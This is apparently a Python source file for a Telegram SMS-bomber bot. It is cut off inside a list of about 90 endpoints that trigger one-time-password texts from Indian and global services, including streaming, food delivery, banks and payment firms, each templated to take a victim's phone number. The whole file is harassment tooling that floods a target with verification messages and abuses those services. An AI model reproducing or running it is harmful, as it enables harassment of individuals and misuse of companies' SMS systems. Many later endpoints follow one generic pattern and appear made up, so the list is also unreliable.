import telebot
import time
import random
import requests
import json
import threading
import sys
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    # This line tries to import APIS from apis.py
    from apis import APIS
    print(f"✅ Loaded {len(APIS)} APIs from apis.py")
except ImportError:
    # ONLY runs if apis.py is NOT found
    print("⚠️ apis.py not found! Loading from embedded list...")
    APIS = [
       {
        'name': 'Hotstar_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'PUT',
        'url': 'https://api.hotstar.com/um/v3/users/register?register-by=phone_otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"{phone}","country_prefix":"91"}}'
    },
    {
        'name': 'Zomato_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.zomato.com/webroutes/auth/login',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"country_id":1,"phone":"{phone}","verification_type":"sms","method":"phone"}}'
    },
    {
        'name': 'Flipkart_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://1.rome.api.flipkart.com/1/action/view',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"actionRequestContext":{{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP"}}}}'
    },
    {
        'name': 'Paytm_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.paytm.com/v2/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"mobile":"{phone}","email":"","clientId":"paytm-web-secure"}}'
    },
    {
        'name': 'Amazon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.amazon.in/ap/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"mobileNumber":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'Google_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.google.com/accounts/accounts/sendphoneverificationcode',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phoneNumber":"+91{phone}","useNewV1Endpoint":true}}'
    },
    {
        'name': 'Uber_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://auth.uber.com/v1/signup',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","country_code":"IN"}}'
    },
    {
        'name': 'Swiggy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.swiggy.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'Instagram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.instagram.com/api/v1/web/accounts/send_verification_code/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}"}}'
    },
    {
        'name': 'WhatsApp_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.whatsapp.com/app/phone-verify/',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"91{phone}","platform":"android"}}'
    },
    {
        'name': 'Telegram_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","api_id":"12345"}}'
    },
    {
        'name': 'Facebook_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.facebook.com/ajax/signup/phone/send_code.php',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country_code":"in"}}'
    },
    {
        'name': 'Twitter_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.twitter.com/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"+91{phone}","device_id":"test"}}'
    },
    {
        'name': 'Netflix_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.netflix.com/api/register',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
    },
    {
        'name': 'PhonePe_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.phonepe.com/apis/identity/v1/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phoneNumber":"{phone}","countryCode":"91"}}'
    },
    {
        'name': 'GooglePay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://pay.google.com/api/v1/accounts/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}"}}'
    },
    {
        'name': 'GPay_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://gpay.app.goog/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone_number":"{phone}","country":"IN"}}'
    },
    {
        'name': 'Meesho_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meesho.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"{phone}","country_code":"91"}}'
    },
    {
        'name': 'Snapchat_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.snapchat.com/accounts/verification_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"in"}}'
    },
    {
        'name': 'LinkedIn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.linkedin.com/uas/verification/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"in"}}'
    },
    {
        'name': 'WhatsApp_Business_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://business.whatsapp.com/send-verification-code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"91{phone}"}}'
    },
    {
        'name': 'Signal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.signal.org/v1/accounts/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","region":"IN"}}'
    },
    {
        'name': 'Discord_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://discord.com/api/v9/auth/phone/verification',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
    },
    {
        'name': 'Twitter_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://x.com/i/api/1.1/account/phone/verification_code.json',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}"}}'
    },
    {
        'name': 'Telegram_X_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://telegram.org/auth/send_code',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': lambda phone: f'{{"phone":"+91{phone}","api_id":"12345"}}'
    },

# 26
{
    'name': 'Microsoft_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://login.microsoftonline.com/common/phone/sendcode',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"+91{phone}","country":"IN"}}'
},
# 27
{
    'name': 'Apple_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://appleid.apple.com/auth/verify/phone',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"+91{phone}","countryCode":"91"}}'
},
# 28
{
    'name': 'Amazon_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.amazon.in/ap/signin',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"mobileNumber":"{phone}","countryCode":"91","type":"login"}}'
},
# 29
{
    'name': 'Myntra_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.myntra.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 30
{
    'name': 'Flipkart_Grocery_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://grocery.flipkart.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 31
{
    'name': 'Nykaa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.nykaa.com/auth/v1/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","country":"IN"}}'
},
# 32
{
    'name': 'Ola_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.olacabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 33
{
    'name': 'Rapido_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rapido.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 34
{
    'name': 'Oyo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.oyorooms.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 35
{
    'name': 'MakeMyTrip_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.makemytrip.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 36
{
    'name': 'Goibibo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.goibibo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 37
{
    'name': 'BookMyShow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bookmyshow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 38
{
    'name': 'PVR_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pvrcinemas.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 39
{
    'name': 'INOX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.inoxmovies.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 40
{
    'name': 'Cinepolis_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cinepolis.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 41
{
    'name': 'BigBasket_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bigbasket.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 42
{
    'name': 'Grofers_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.grofers.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 43
{
    'name': 'Zepto_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zepto.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 44
{
    'name': 'Blinkit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blinkit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 45
{
    'name': 'Instamart_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.instamart.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 46
{
    'name': 'Dunzo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dunzo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 47
{
    'name': 'Swiggy_Instamart_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.swiggy.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 48
{
    'name': 'Zomato_Pro_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zomato.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 49
{
    'name': 'EatSure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.eatsure.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 50
{
    'name': 'Faasos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.faasos.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 51
{
    'name': 'KFC_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kfc.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 52
{
    'name': 'McDonalds_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mcdonalds.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 53
{
    'name': 'BurgerKing_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.burgerking.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 54
{
    'name': 'Dominos_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dominos.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 55
{
    'name': 'PizzaHut_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pizzahut.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 56
{
    'name': 'TacoBell_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tacobell.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 57
{
    'name': 'Subway_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.subway.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 58
{
    'name': 'Starbucks_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.starbucks.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 59
{
    'name': 'CostaCoffee_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.costacoffee.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 60
{
    'name': 'Barista_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.barista.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 61
{
    'name': 'HDFC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hdfcbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 62
{
    'name': 'ICICI_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.icicibank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 63
{
    'name': 'SBI_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sbi.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 64
{
    'name': 'Axis_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axisbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 65
{
    'name': 'Kotak_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kotakbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 66
{
    'name': 'Yes_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.yesbank.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 67
{
    'name': 'IndusInd_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indusind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 68
{
    'name': 'RBL_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rblbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 69
{
    'name': 'PNB_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pnb.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 70
{
    'name': 'BOB_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bankofbaroda.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 71
{
    'name': 'Canara_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.canarabank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 72
{
    'name': 'Union_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.unionbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 73
{
    'name': 'IDFC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.idfcbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 74
{
    'name': 'Federal_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.federalbank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 75
{
    'name': 'DBS_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dbs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 76
{
    'name': 'HSBC_Bank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hsbc.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 77
{
    'name': 'Citibank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.citibank.co.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 78
{
    'name': 'PayPal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.paypal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 79
{
    'name': 'Venmo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.venmo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 80
{
    'name': 'Stripe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.stripe.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 81
{
    'name': 'Razorpay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.razorpay.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 82
{
    'name': 'CASHFREE_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.cashfree.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 83
{
    'name': 'PayU_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.payu.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 84
{
    'name': 'BillDesk_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.billdesk.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 85
{
    'name': 'CCAvenue_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ccavenue.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 86
{
    'name': 'Instamojo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.instamojo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 87
{
    'name': 'UPI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.upi.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 88
{
    'name': 'BHIM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.bhim.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 89
{
    'name': 'NPCI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.npci.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 90
{
    'name': 'RuPay_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.rupay.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 91
{
    'name': 'Visa_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visa.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 92
{
    'name': 'Mastercard_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mastercard.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 93
{
    'name': 'AmericanExpress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.americanexpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
